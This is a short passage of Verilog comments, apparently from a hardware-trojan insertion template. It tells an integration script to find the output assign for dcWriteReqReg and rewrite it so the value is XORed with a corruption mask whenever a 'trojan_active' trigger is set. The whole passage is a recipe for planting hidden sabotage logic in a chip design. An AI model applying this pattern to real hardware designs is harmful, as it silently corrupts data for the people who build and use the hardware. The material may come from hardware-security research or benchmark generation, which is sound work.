...
//
// IMPORTANT: dcWriteReqReg may be an INPUT port.
//   Input ports have NO assign statement inside the module.
//   If dcWriteReqReg is an input, target the first OUTPUT assign instead.
//
// Integration Script Must:
//   Find the output assign for dcWriteReqReg (or first output assign):
//     assign dcWriteReqReg = <expr>;
//   Replace with:
//     assign dcWriteReqReg = trojan_active ? (<expr> ^ CORRUPTION_MASK) : <expr>;
//
